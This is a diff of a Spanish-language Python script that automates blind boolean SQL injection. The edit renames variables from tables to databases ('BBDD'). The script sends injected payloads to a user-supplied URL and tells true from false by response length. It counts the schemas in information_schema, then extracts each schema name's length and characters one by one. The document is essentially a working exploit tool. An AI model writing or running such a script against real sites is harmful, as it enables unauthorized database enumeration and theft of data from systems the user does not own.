@@ -1,7 +1,7 @@
 import requests
 
 
-def sacarNumTablas(url):
+def sacarNumBBDD(url):
     payload = "'+or+(select+count(schema_name)+from+information_schema.schemata)%3d@+--+-+"
     
 
@@ -91,7 +91,7 @@ def SacarLargoNombre(numBase, url, numeroABuscarLargoNombre, datazos):
             Longitud=len(respuesta.content)
             
             if(Longitud != LongitudDeError):
-               print(f"El nombre de la tabla contiene este numero de letras: {i}")
+               print(f"El nombre de la BBDD contiene este numero de letras: {i}")
                print("------------------------------------------------------")
                return i
         except requests.exceptions.HTTPError:
@@ -123,7 +123,7 @@ def sacarNombre(longitudNombreTabla, url, numTabla, datazos):
 
     payload = "'+or+substring((select+schema_name+from+information_schema.schemata+limit+^,1),@,1)='/'+--+-+"
     payloadPers = payload.replace("^" ,str(numTabla))
-    nombreTabla = ""
+    nombreBBDD = ""
     for i in range (longitudNombreTabla):
         payloadPersNum= payloadPers.replace("@", str(i+1))
         for j in range (95, 128):
@@ -142,27 +142,27 @@ def sacarNombre(longitudNombreTabla, url, numTabla, datazos):
                 Longitud=len(respuesta.content)
             
                 if(Longitud != LongitudDeError):
-                    nombreTabla+=chr(j)
-                    print(nombreTabla)
+                    nombreBBDD+=chr(j)
+                    print(nombreBBDD)
             except requests.exceptions.HTTPError:
                 print(f"Error al obtener la pagina web: {url}")
 
-    print(f"El nombre de la tabla es: {nombreTabla}")
+    print(f"El nombre de la BBDD es: {nombreBBDD}")
     print("------------------------------------------------------")
 #####################################################################################
 
 url=(input("Introduzca la URL:"))
 
-numeroBaseDeDatos, datazos=sacarNumTablas(url)
+numeroBaseDeDatos, datazos=sacarNumBBDD(url)
 if(numeroBaseDeDatos !=0):
     for i in range(numeroBaseDeDatos):
         numeroABuscarLargoNombre=1
-        longitudNombreTabla=1
-        while(longitudNombreTabla == 1 ):
+        longitudNombreBBDD=1
+        while(longitudNombreBBDD == 1 ):
             numeroABuscarLargoNombre+=1
             #numeroABuscarLargoNombre=int(input("Introduzca el numero de largo del nombre: "))
-            longitudNombreTabla = SacarLargoNombre(i, url, numeroABuscarLargoNombre, datazos)
-        sacarNombre(longitudNombreTabla, url, i, datazos)
+            longitudNombreBBDD = SacarLargoNombre(i, url, numeroABuscarLargoNombre, datazos)
+        sacarNombre(longitudNombreBBDD, url, i, datazos)
 else:
     print("No se pudo sacar el numero de bases de datos, revisa el URL proporcionado")
 
